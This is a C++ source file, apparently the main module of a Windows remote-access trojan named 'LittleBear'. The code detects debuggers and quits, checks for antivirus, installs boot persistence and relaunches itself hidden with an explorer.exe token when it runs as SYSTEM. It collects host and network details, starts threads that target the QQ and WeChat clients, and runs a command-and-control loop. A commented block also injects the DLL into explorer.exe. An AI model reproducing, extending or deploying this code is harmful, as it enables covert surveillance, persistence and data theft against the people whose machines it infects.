#include <Windows.h>
#include "publicvar.h"
#include "function/DeviceInformation.h"
#include "LittleBearDll.h"
#include "AntiVirusInfo.h"
#include "initParams.h"
#include "winternl.h"
#include "BootAutoRun.h"
#include "network/NetWorkcommand.h"
#include "function/BasicDeviceInfo.h"
#include <tlhelp32.h>
#include "network/NetWorkData.h"
#include "Config.h"
#include "DllExport.h"
#include "FileOperator.h"
#include "BootWithApp.h"
#include <DbgHelp.h>
#include "PublicFunc.h"
#include "function/lan.h"
#include "InjectDll.h"

#include "json/json.h"
#include <string>
#include <fstream>
#include <iostream>
#include <UserEnv.h>
#include <ShlObj.h>

#pragma comment(lib,"userenv.lib")
#pragma comment(lib,"Shell32.lib")
#pragma comment(lib, "zlib.lib")

using namespace std;

#ifdef _DEBUG
//#pragma comment(lib,"json_vc71_libmtd.lib")
#else
//#pragma comment(lib,"json_vc71_libmt.lib")
#endif

#ifndef _WIN64
#endif

//http://api.ipify.org
//http://icanhazip.com/
//http://ip-api.com/line/



int CreateProcessByToken(LPSTR lpTokenProcessName, LPSTR szProcessName, LPSTR szparam)
{
	int ret = 0;
	HANDLE hToken = 0;

	PROCESSENTRY32 pe32 = { 0 };
	pe32.dwSize = sizeof(PROCESSENTRY32);
	HANDLE hProcessSnap = lpCreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	
	for (lpProcess32First(hProcessSnap, &pe32); lpProcess32Next(hProcessSnap, &pe32);)
	{
		char szParam[MAX_PATH] = { 0 };
		int iRet = lpWideCharToMultiByte(CP_ACP, 0, pe32.szExeFile, lplstrlenW(pe32.szExeFile), szParam, MAX_PATH, NULL, NULL);
		if (lstrcmpiA(_strupr(szParam), _strupr(lpTokenProcessName)) != 0) {
			continue;
		}
			
		HANDLE hProcess = lpOpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pe32.th32ProcessID);
		ret = lpOpenProcessToken(hProcess, TOKEN_ALL_ACCESS, &hToken);
		lpCloseHandle(hProcess);
	}

	lpCloseHandle(hProcessSnap);

	if (hToken == 0) {
		return 0;
	}
	
	PROCESS_INFORMATION pi = { 0 };
	STARTUPINFOA si = { 0 };
	si.cb = sizeof(STARTUPINFO);
	lplstrcpyA(si.lpDesktop, "winsta0\\default");
	si.dwFlags = STARTF_USESHOWWINDOW;
	si.wShowWindow = SW_HIDE;

	LPVOID lpEnvBlock = NULL;
	BOOL bEnv = CreateEnvironmentBlock(&lpEnvBlock, hToken, FALSE);
	DWORD dwFlags = CREATE_NEW_CONSOLE;
	if (bEnv)
	{
		dwFlags |= CREATE_UNICODE_ENVIRONMENT;
	}

	//si.dwFlags |= dwFlags;
	// 环境变量创建失败仍然可以创建进程，但会影响到后面的进程获取环境变量内容
	ret = CreateProcessAsUserA(
		hToken,
		szProcessName,
		szparam,
		NULL,
		NULL,
		FALSE,
		dwFlags,
		bEnv ? lpEnvBlock : NULL,
		NULL,
		&si,
		&pi);

	// 使用完毕需要释放环境变量的空间
	if (bEnv)
	{
		ret = DestroyEnvironmentBlock(lpEnvBlock);
	}

	return ret;
}


int IsSystemPrivilege()
{
	char szPath[MAX_PATH] = { 0 };
	if (SHGetSpecialFolderPathA(NULL, szPath, CSIDL_APPDATA, TRUE))
	{
		string flag("config\\systemprofile");
		string path(szPath);
		if (path.find(flag) != std::string::npos)
		{
			return TRUE;
		}
	}

	return FALSE;
}


int isSystemDirectory() {
	char szcurdir[MAX_PATH] = { 0 };
	int ret = GetCurrentDirectoryA(MAX_PATH, szcurdir);
	if (_stricmp(szcurdir + 1, ":\\Windows\\system32") == 0)
	{
		return TRUE;
	}

	return FALSE;
}


extern "C" __declspec(dllexport) int __stdcall LittleBear()
{
	BOOL bSystemPri = IsSystemPrivilege();
	//BOOL bSystemDir = isSystemDirectory();
	if (bSystemPri )
	{
		char szcurdir[MAX_PATH] = {0};
		int iRet = GetModuleFileNameA(0,szcurdir,MAX_PATH);
		char tokenname[16] = { 'e','x','p','l','o','r','e','r','.','e','x','e',0 };
		iRet = CreateProcessByToken(tokenname,szcurdir,"");
		ExitProcess(0);
	}

	char szout[1024];
	//this function can be everywhere
	int iRet = PebNtGlobalFlagsApproach();
	if(iRet)
	{
#ifndef _DEBUG
		WriteLittleBearRawLog("program is debuggered\r\n");
		return FALSE;
#endif
	}

	//need to be first function
	iRet = _GetApi();
	if(iRet == 0)
	{
		WriteLittleBearRawLog("_GetApi error\r\n");
		return FALSE;
	}
	else
	{
		//after work path created and getapi,u can write log file
		//WriteLittleBearLog("_GetApi ok\r\n");
	}




	//need to get computer info before write log file
	iRet = GetUserAndComputerName(strUserName,strComputerName);
	iCpuBits = GetCpuBits();
	iSystemVersion = GetWindowsVersion(strSysVersion);
	iRet = GetSystemDir(szSysDir);
	iRet = CheckAndCreateDataPath();
	if (iRet == FALSE)
	{
		return FALSE;
	}

#ifdef _DEBUG
	WriteLittleBearLog("get function and create work path ok,the program is starting\r\n");
#endif

	iRet = GetParentProcName(szParentProcName);
	if (iRet == 0)
	{
		//OutputDebugStringA(szParentProcName);
		//return FALSE;
	}

	DWORD uac = IsUACEnable(iCpuBits,&iEnableLUA,&iConsentPromptBehaviorAdmin,&iPromptOnSecureDesktop);
	iIsUserAdmin = IsAdministratorUser(lpDllShell32);
	iIsProcessAdmin = IsProcessAdmin();

	//you can do everything from here after
	iRet = GetAntivirusSoftInfo();
	if (iRet == 0)
	{
		WriteLittleBearRawLog("GetAntivirusSoftInfo false\r\n");
		return FALSE;
	}

// 	if (iCpuBits == 32 && b360Running == FALSE  )
// 	{
// 		//char strProcNameQQ[] = {'Q','Q','.','E','X','E',0};
// 		//char strQQDll[] = { 'H','o','o','k','Q','Q','M','s','g','D','l','l','.','d','l','l',0 };
// 		char filename[MAX_PATH];
// 		lpGetModuleFileNameA(0, filename, MAX_PATH);
// 		char szexplorer[] = { 'e','x','p','l','o','r','e','r','.','e','x','e',0 };
// 		if (strstr(filename, szexplorer) == 0)
// 		{
// 			char szpath[MAX_PATH];
// 			GetPathFromFullName(filename, szpath);
// 			lpGetModuleBaseNameA(GetCurrentProcess(), lpThisDll, filename, MAX_PATH);
// 			string dllpath = string(szpath) + filename;
// 
// 			lpwsprintfA(szout, "inject file %s into %s\r\n", dllpath.c_str(), szexplorer);
// 			WriteLittleBearLog(szout);
// 
// 			iRet = InjectDllToProcess(szexplorer, (char*)dllpath.c_str());
// 			if (iRet)
// 			{
// 				lpExitProcess(0);
// 				return TRUE;
// 			}
// 		}
// 	}


	iRet = SetBootAutoRun(szSysDir,strPEResidence,b360Running,iSystemVersion);

	iRet = InitWindowsSocket();
	if (iRet == 0)
	{
		WriteLittleBearRawLog("InitWindowsSocket false\r\n");
		return FALSE;
	}

	iRet = InitDisplayParam(&JPG_STREAM_SIZE,&BMP_STREAM_SIZE,&REMOTECONTROL_BUFFER_SIZE);

	//for more faster to load program
	RegetApi();

	iRet = GetDiskVolumeSerialNo(&ulVolumeSerialNo);
	iRet = GetNetCardInfo(strLocalIP,cMAC,strLocalMac,strLocalExternalIP,strGateWayIP,strGateWayMac);
	iRet = GetHostName(strHostName);

	__try {
		lpCloseHandle(lpCreateThread(0, 0, (LPTHREAD_START_ROUTINE)QQParasite, 0, 0, 0));
		lpCloseHandle(lpCreateThread(0, 0, (LPTHREAD_START_ROUTINE)WeixinParasite, 0, 0, 0));
	}
	__except (1) {
		WriteLittleBearRawLog("QQParasite or WeixinParasite exception\r\n");
	}

	iRet = IndependentNetWorkInit();

	lpCloseHandle(lpCreateThread(0,0,(LPTHREAD_START_ROUTINE)NetworkData,0,0,0));

	while (TRUE)
	{
		DWORD dwthreadid = 0;
		HANDLE hnetwork = lpCreateThread(0,0,(LPTHREAD_START_ROUTINE)NetWorkCommand,0,0,&dwthreadid);

		iRet = lpWaitForSingleObject(hnetwork, INFINITE);
		lpCloseHandle(hnetwork);
		lpSleep(HEARTBEAT_LOOP_DELAY);
	}
	return TRUE;
}









#ifndef  _WINDLL
int __stdcall WinMain( __in HINSTANCE hInstance, __in_opt HINSTANCE hPrevInstance, __in LPSTR lpCmdLine, __in int nShowCmd )
{

	lpThisDll = hInstance;
	LittleBear();
	ExitProcess(0);
	return TRUE;
}
#elif defined _WINDLL
int __stdcall DllMain(HMODULE hDll,DWORD dwReson,DWORD dwReseved)
{
	lpThisDll = hDll;
	if (dwReson == DLL_PROCESS_ATTACH)
	{
		//DisableThreadLibraryCalls((HMODULE)hDll);
		//CloseHandle(CreateThread(0, 0, (LPTHREAD_START_ROUTINE)LittleBear, 0, 0, 0));
		return TRUE;
		//TerminateProcess(GetCurrentProcess(),0);
	}
	else if (dwReson == DLL_PROCESS_DETACH)
	{
		//MessageBoxA(0,"DLL_PROCESS_DETACH","DLL_PROCESS_DETACH",MB_OK);
		return TRUE;
	}
	else if(dwReson == DLL_THREAD_ATTACH)
	{
		//MessageBoxA(0,"DLL_THREAD_ATTACH","DLL_THREAD_ATTACH",MB_OK);
		return TRUE;
	}
	else if (dwReson == DLL_THREAD_DETACH)
	{
		//MessageBoxA(0,"DLL_THREAD_DETACH","DLL_THREAD_DETACH",MB_OK);
		return TRUE;
	}

	//MessageBoxA(0, "LittleBear DllMain", "LittleBear DllMain", MB_OK);
	return TRUE;
}
#elif defined HOOK_ORG_DLL
int __stdcall DllMain(HMODULE hDll,DWORD dwReson,DWORD dwReseved)
{
	lpThisDll = hDll;
	if (dwReson == DLL_PROCESS_ATTACH)
	{
		DisableThreadLibraryCalls((HMODULE)hDll);
		return TRUE;
		//TerminateProcess(GetCurrentProcess(),0);
	}
	else if (dwReson == DLL_PROCESS_DETACH)
	{
		//MessageBoxA(0,"DLL_PROCESS_DETACH","DLL_PROCESS_DETACH",MB_OK);
		return TRUE;
	}
	else if(dwReson == DLL_THREAD_ATTACH)
	{
		//MessageBoxA(0,"DLL_THREAD_ATTACH","DLL_THREAD_ATTACH",MB_OK);
		return TRUE;
	}
	else if (dwReson == DLL_THREAD_DETACH)
	{
		//MessageBoxA(0,"DLL_THREAD_DETACH","DLL_THREAD_DETACH",MB_OK);
		return TRUE;
	}

	//MessageBoxA(0,0,0,0);
	return TRUE;
}
#endif



int DllTestMsgBox(int hwnd, char * lptext, char * lpcap, int mode) {
	MessageBoxA((HWND)hwnd, lptext, lpcap, mode);
	return 0;
};

int DllTestMsgBox(char * lptext, char * lpcap) {
	MessageBoxA(0, lptext, lpcap, MB_OK);
	return 0;
};


int DllTestFreeLibrary(void * hm) {
	return FreeLibrary((HMODULE)hm);
}


void* DllTestLoadLibrary(char * lpdll) {
	char szlibpath[MAX_PATH];
	int result = GetSystemWow64DirectoryA(szlibpath, MAX_PATH);
	if (result == FALSE)
	{
		result = GetSystemDirectoryA(szlibpath, MAX_PATH);
		if (result == FALSE)
		{
			return FALSE;
		}
	}

	lstrcatA(szlibpath, "\\");
	lstrcatA(szlibpath, lpdll);
	void * ret = (void*)LoadLibraryA(szlibpath);

	//char szout[MAX_PATH];
	//wsprintfA(szout,"%s:%x",szlibpath,ret);
	//MessageBoxA(0,szout,"loadlibrary",MB_OK);
	return ret;
}


void* DllTestGetProcAddress(void* hm, char *szfunc) {
	return (LPVOID)GetProcAddress((HMODULE)hm, szfunc);
}



void DllTestCreateThread() {
	CloseHandle(CreateThread(0, 0, (LPTHREAD_START_ROUTINE)LittleBear, 0, 0, 0));
}